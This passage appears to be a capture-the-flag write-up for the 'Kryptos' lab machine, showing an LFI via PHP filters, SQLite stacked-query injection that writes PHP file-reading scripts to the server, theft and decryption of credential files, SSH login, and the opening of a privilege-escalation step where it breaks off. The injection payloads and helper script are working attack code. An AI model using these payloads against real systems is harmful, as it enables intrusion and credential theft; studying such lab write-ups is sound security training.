<p>It’s probably expecting some parameter either in a GET or POST request but I don’t know what the parameter name is. The <code class="language-plaintext highlighter-rouge">index.php</code> page uses the <code class="language-plaintext highlighter-rouge">view</code> parameter to display the other pages by including the parameter name concatenated with the <code class="language-plaintext highlighter-rouge">.php</code> extension. I can confirm this below by browsing to <code class="language-plaintext highlighter-rouge">about.php</code> directly.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py http://127.0.0.1/dev/about.php
This is about page
</code></pre></div></div>

<p>This <code class="language-plaintext highlighter-rouge">view</code> parameter is probably a good target for an LFI but at first glance I wasn’t able to get anywhere when I tried the obvious suspects like <code class="language-plaintext highlighter-rouge">../../../etc/passwd</code> because <code class="language-plaintext highlighter-rouge">.php</code> is appended to the parameter:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py http://127.0.0.1/dev/index.php?view=../../../../etc/passwd
&lt;html&gt;
    &lt;head&gt;
    &lt;/head&gt;
    &lt;body&gt;
	&lt;div class="menu"&gt;
	    &lt;a href="index.php"&gt;Main Page&lt;/a&gt;
	    &lt;a href="index.php?view=about"&gt;About&lt;/a&gt;
	    &lt;a href="index.php?view=todo"&gt;ToDo&lt;/a&gt;
	&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>So I used the PHP filter trick to read the <code class="language-plaintext highlighter-rouge">sqlite_test_page.php</code>. I’m using the base64 filter to encode and return the content of the file being included.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py "http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page"
&lt;html&gt;
    &lt;head&gt;
    &lt;/head&gt;
    &lt;body&gt;
	&lt;div class="menu"&gt;
	    &lt;a href="index.php"&gt;Main Page&lt;/a&gt;
	    &lt;a href="index.php?view=about"&gt;About&lt;/a&gt;
	    &lt;a href="index.php?view=todo"&gt;ToDo&lt;/a&gt;
	&lt;/div&gt;
PGh0bWw+CjxoZWFkPjwvaGVhZD4KPGJvZHk+Cjw/cGhwCiRub19yZXN1bHRzID0gJF9HRVRbJ25vX3Jlc3VsdHMnXTsKJGJvb2tpZCA9ICRfR0VUWydib29raWQnXTsKJHF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gYm9va3MgV0hFUkUgaWQ9Ii4kYm9va2lkOwppZiAoaXNzZXQoJGJvb2tpZCkpIHsKICAgY2xhc3MgTXlEQiBleHRlbmRzIFNRTGl0ZTMKICAgewogICAgICBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpCiAgICAgIHsKCSAvLyBUaGlzIGZvbGRlciBpcyB3b3JsZCB3cml0YWJsZSAtIHRvIGJlIGFibGUgdG8gY3JlYXRlL21vZGlmeSBkYXRhYmFzZXMgZnJvbSBQSFAgY29kZQogICAgICAgICAkdGhpcy0+b3BlbignZDllMjhhZmNmMGIyNzRhNWUwNTQyYWJiNjdkYjA3ODQvYm9va3MuZGInKTsKICAgICAgfQogICB9CiAgICRkYiA9IG5ldyBNeURCKCk7CiAgIGlmKCEkZGIpewogICAgICBlY2hvICRkYi0+bGFzdEVycm9yTXNnKCk7CiAgIH0gZWxzZSB7CiAgICAgIGVjaG8gIk9wZW5lZCBkYXRhYmFzZSBzdWNjZXNzZnVsbHlcbiI7CiAgIH0KICAgZWNobyAiUXVlcnkgOiAiLiRxdWVyeS4iXG4iOwoKaWYgKGlzc2V0KCRub19yZXN1bHRzKSkgewogICAkcmV0ID0gJGRiLT5leGVjKCRxdWVyeSk7CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9Cn0KZWxzZQp7CiAgICRyZXQgPSAkZGItPnF1ZXJ5KCRxdWVyeSk7CiAgIHdoaWxlKCRyb3cgPSAkcmV0LT5mZXRjaEFycmF5KFNRTElURTNfQVNTT0MpICl7CiAgICAgIGVjaG8gIk5hbWUgPSAiLiAkcm93WyduYW1lJ10gLiAiXG4iOwogICB9CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9CiAgICRkYi0+Y2xvc2UoKTsKfQp9Cj8+CjwvYm9keT4KPC9odG1sPgo=&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>After decoding the base64, I got the source code for <code class="language-plaintext highlighter-rouge">sqlite_test_page.php</code></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="cp">&lt;?php</span>
<span class="nv">$no_results</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'no_results'</span><span class="p">];</span>
<span class="nv">$bookid</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'bookid'</span><span class="p">];</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM books WHERE id="</span><span class="mf">.</span><span class="nv">$bookid</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$bookid</span><span class="p">))</span> <span class="p">{</span>
   <span class="kd">class</span> <span class="nc">MyDB</span> <span class="kd">extends</span> <span class="nc">SQLite3</span>
   <span class="p">{</span>
      <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span>
      <span class="p">{</span>
	 <span class="c1">// This folder is world writable - to be able to create/modify databases from PHP code</span>
         <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">open</span><span class="p">(</span><span class="s1">'d9e28afcf0b274a5e0542abb67db0784/books.db'</span><span class="p">);</span>
      <span class="p">}</span>
   <span class="p">}</span>
   <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyDB</span><span class="p">();</span>
   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$db</span><span class="p">){</span>
      <span class="k">echo</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">lastErrorMsg</span><span class="p">();</span>
   <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">"Opened database successfully</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">echo</span> <span class="s2">"Query : "</span><span class="mf">.</span><span class="nv">$query</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$no_results</span><span class="p">))</span> <span class="p">{</span>
   <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
   <span class="k">if</span><span class="p">(</span><span class="nv">$ret</span><span class="o">==</span><span class="kc">FALSE</span><span class="p">)</span>
    <span class="p">{</span>
	<span class="k">echo</span> <span class="s2">"Error : "</span><span class="mf">.</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">lastErrorMsg</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
   <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
   <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$ret</span><span class="o">-&gt;</span><span class="nf">fetchArray</span><span class="p">(</span><span class="no">SQLITE3_ASSOC</span><span class="p">)</span> <span class="p">){</span>
      <span class="k">echo</span> <span class="s2">"Name = "</span><span class="mf">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="k">if</span><span class="p">(</span><span class="nv">$ret</span><span class="o">==</span><span class="kc">FALSE</span><span class="p">)</span>
    <span class="p">{</span>
	<span class="k">echo</span> <span class="s2">"Error : "</span><span class="mf">.</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">lastErrorMsg</span><span class="p">();</span>
    <span class="p">}</span>
   <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Based on the code above I see that:</p>
<ul>
  <li>The <code class="language-plaintext highlighter-rouge">d9e28afcf0b274a5e0542abb67db0784</code> directory is world writable</li>
  <li>The GET parameters for this code are <code class="language-plaintext highlighter-rouge">no_results</code> and <code class="language-plaintext highlighter-rouge">bookid</code>
</li>
  <li>The SQL query is clearly injectable as there is no sanitization done</li>
</ul>

<p>I downloaded the entire .db file using the PHP filter LFI and it only contains a single table with two rows so there is nothing of value to extract using an SQL injection.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># sqlite3 books.db
SQLite version 3.27.2 2019-02-25 16:06:06
Enter ".help" for usage hints.
sqlite&gt; .tables
books
sqlite&gt; select * from books;
1|Serious Cryptography
2|Applied Cryptography

# python decrypthttp.py http://127.0.0.1/dev/sqlite_test_page.php?bookid=1
&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
Opened database successfully
Query : SELECT * FROM books WHERE id=1
Name = Serious Cryptography
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>I tried a simple injection with <code class="language-plaintext highlighter-rouge">1 or 2</code> but it failed when I tried it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?bookid=1 or 2"
&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;400 Bad Request&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Bad Request&lt;/h1&gt;
&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;
&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div></div>

<p>This is because I need to URL encode the value of the <code class="language-plaintext highlighter-rouge">bookid</code> parameter otherwise the query becomes invalid.</p>

<p>I modified the script to support a 2nd argument that contains extra data that needs to be URL encoded twice:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">readline</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">urllib</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"Cookie"</span><span class="p">:</span> <span class="s">"PHPSESSID=pek49sa9sh4ntpca7cp1f5nffi"</span><span class="p">}</span>
<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"http"</span><span class="p">:</span> <span class="s">"http://127.0.0.1:8080"</span> <span class="p">}</span>

<span class="k">def</span> <span class="nf">sxor</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span><span class="n">s2</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span><span class="n">s2</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">extra</span> <span class="o">=</span> <span class="s">""</span>  <span class="c1"># Extra payload to be double-encoded
</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"Usage: decrypthttp.py &lt;url&gt; &lt;extra&gt;"</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
    <span class="n">extra</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">urllib</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"keystream"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">k</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://kryptos.htb/encrypt.php?cipher=RC4&amp;url=%s%s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">extra</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">"html.parser"</span><span class="p">)</span>
<span class="n">result_b64</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"textarea"</span><span class="p">).</span><span class="n">string</span>
<span class="k">if</span> <span class="n">result_b64</span><span class="p">:</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">result_b64</span><span class="p">)</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">sxor</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
    <span class="k">print</span> <span class="n">p</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"** Nothing returned **"</span>
</code></pre></div></div>

<p>Testing the injection again, I can see that it works now since I get both book entries:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?bookid=" "1 or 2"
&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
Opened database successfully
Query : SELECT * FROM books WHERE id=1 or 2
Name = Serious Cryptography
Name = Applied Cryptography
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>Sqlite supports stacked queries so that allows me to write arbitrary files. I can create a new database in the <code class="language-plaintext highlighter-rouge">d9e28afcf0b274a5e0542abb67db0784</code> directory and write PHP data into a table. Then by issuing a GET to that file the PHP code should be reached and executed.</p>

<p>First, I tested writing a simple text file with no PHP code.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&amp;bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.txt' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('Testing...');"
&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
Opened database successfully
Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.txt' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('Testing...');
&lt;/body&gt;
&lt;/html&gt;

# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test.txt"
��.EtablepwnpwnCREATE TABLE pwn (yolo text)
  !Testing...
</code></pre></div></div>

<p>So this confirms that I can now write files to the target directory. Then I wrote a <code class="language-plaintext highlighter-rouge">phpinfo.php</code> to check the PHP configuration:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&amp;bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/phpinfo.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('&lt;?php phpinfo(); ?&gt;');"
&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
Opened database successfully
Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/phpinfo.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('&lt;?php phpinfo(); ?&gt;');
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/phpinfo.php"
[...]
&lt;tr&gt;&lt;td class="e"&gt;System &lt;/td&gt;&lt;td class="v"&gt;Linux kryptos 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:
33:07 UTC 2019 x86_64 &lt;/td&gt;&lt;/tr&gt;
[...]
&lt;tr&gt;&lt;td class="e"&gt;disable_functions&lt;/td&gt;&lt;td class="v"&gt;system,dl,passthru,exec,shell_exec,popen,escapeshe
llcmd,escapeshellarg,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pc
ntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_si
gnal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwa
itinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,&lt;/td&gt;&lt;td cl
ass="v"&gt;system,dl,passthru,exec,shell_exec,popen,escapeshellcmd,escapeshellarg,pcntl_alarm,pcntl_fork,pc
ntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexit
status,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_g
et_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_get
priority,pcntl_setpriority,pcntl_async_signals,&lt;/td&gt;&lt;/tr&gt;
</code></pre></div></div>

<p>I can’t easily get a PHP shell since most of the “dangerous” functions are disabled. But I can read directories and files.</p>

<p>To scan directories:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&amp;bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/dir.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('&lt;?php var_dump(scandir(\$_GET[\"x\"])); ?&gt;');"
</code></pre></div></div>

<p>I found the user directory and interesting files in it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dir.php?x=/home/"
��)[array(3) {nCREATE TABLE pwn (yolo text)
  [0]=&gt;
  string(1) "."
  [1]=&gt;
  string(2) ".."
  [2]=&gt;
  string(8) "rijndael"
}

# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dir.php?x=/home/rijndael"
��)[array(13) {CREATE TABLE pwn (yolo text)
  [0]=&gt;
  string(1) "."
  [1]=&gt;
  string(2) ".."
  [2]=&gt;
  string(13) ".bash_history"
  [3]=&gt;
  string(12) ".bash_logout"
  [4]=&gt;
  string(7) ".bashrc"
  [5]=&gt;
  string(6) ".cache"
  [6]=&gt;
  string(6) ".gnupg"
  [7]=&gt;
  string(8) ".profile"
  [8]=&gt;
  string(4) ".ssh"
  [9]=&gt;
  string(9) "creds.old"
  [10]=&gt;
  string(9) "creds.txt"
  [11]=&gt;
  string(7) "kryptos"
  [12]=&gt;
  string(8) "user.txt"
}
</code></pre></div></div>

<p>To read the files:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&amp;bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/file.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('&lt;?php readfile(\$_GET[\"x\"]); ?&gt;');"
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/etc/passwd"
�� Iroot:x:0:0:root:/root:/bin/bashlo text)
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rijndael:x:1001:1001:,,,:/home/rijndael:/bin/bash
mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false

# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/user.txt"
�� ItablepwnpwnCREATE TABLE pwn (yolo text)

# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/creds.txt"
�� IVimCrypt~02!REATE TABLE pwn (yolo text)
�vnd]�K�yYC}�5�6gMRA�nD�@p;�-�

# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/creds.old"
�� Irijndael / Password1BLE pwn (yolo text)
</code></pre></div></div>

<p>Ok, so I can’t read the <code class="language-plaintext highlighter-rouge">user.txt</code> file, I’ll probably need to get a shell first.</p>

<p>The creds files are interesting but the binary output from the PHP script makes it hard to determine what is the content of the file being read versus the binary from the sqlite database. I’ll just modify the script so it outputs the base64 content of file being read instead.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&amp;bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test30.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('&lt;?php echo(\"---\" . base64_encode(file_get_contents(\$_GET[\"x\"])) . \"---\"); ?&gt;');"
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test30.php?x=/home/rijndael/creds.old"
��O�%---cmlqbmRhZWwgLyBQYXNzd29yZDEK---ext)

# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test30.php?x=/home/rijndael/creds.txt"
��O�%---VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu---

# echo -ne "cmlqbmRhZWwgLyBQYXNzd29yZDEK" | base64 -d &gt; creds.old
# echo -ne "VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu" | base64 -d &gt; creds.txt

# cat creds.old
rijndael / Password1
# cat creds.txt
VimCrypt~02!
�vnd]�K�yYC}�5�6gMRA�n
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">creds.txt</code> file contains binary, running <code class="language-plaintext highlighter-rouge">file</code> on it I can see it’s a Vim encrypted file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># file creds.txt
creds.txt: Vim encrypted file data
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">VimCrypt~02!</code> means that the <code class="language-plaintext highlighter-rouge">blowfish</code> cipher is used to encrypt the file.</p>

<p>The <a href="https://dgl.cx/2014/10/vim-blowfish">https://dgl.cx/2014/10/vim-blowfish</a> blog explains a vulnerability in the blowfish Vim implementation. The same IV is used for the first 8 block. Since the encrypted file is very small it means that the same IV is used for both files.</p>

<p>If we look at the encrypted file, we see that the ciphertext is :</p>

<p><img src="/assets/images/htb-writeup-kryptos/creds.png" alt=""></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>930d a810 766e 645d c14b e21c 7959 437d
d935 fb36 674d 5241 8b6e
</code></pre></div></div>

<p>I can guess that the first part of both files is the same -&gt; <code class="language-plaintext highlighter-rouge">rijndael</code> (known plaintext)</p>

<p>By XORing the first 8 bytes of both files I can recover the key stream then the plaintext:</p>

<p><img src="/assets/images/htb-writeup-kryptos/xor1.png" alt=""></p>

<p><img src="/assets/images/htb-writeup-kryptos/xor2.png" alt=""></p>

<p>The password for <code class="language-plaintext highlighter-rouge">rijndael</code> is <code class="language-plaintext highlighter-rouge">bkVBL8Q9HuBSpj</code></p>

<p>I can log in and get the first flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ssh rijndael@kryptos.htb
rijndael@kryptos.htb's password:
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Wed Mar 13 12:31:55 2019 from 192.168.107.1

rijndael@kryptos:~$ cat user.txt
92b69...
</code></pre></div></div>

<h3 id="privesc">Privesc</h3>

<p>The next target is obvious: there’s a python script running as root with a webserver on port 81.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rijndael@kryptos:~/kryptos$ ps -ef | grep python3
[...]
root       772     1  0 Apr07 ?        00:00:07 /usr/bin/python3 /root/kryptos.py
root       846   772  0 Apr07 ?        00:01:35 /usr/bin/python3 /root/kryptos.py
</code></pre></div></div>

<p>Source code is in <code class="language-plaintext highlighter-rouge">~/kryptos/kryptos.py</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">from</span> <span class="nn">ecdsa</span> <span class="kn">import</span> <span class="n">VerifyingKey</span><span class="p">,</span> <span class="n">SigningKey</span><span class="p">,</span> <span class="n">NIST384p</span>
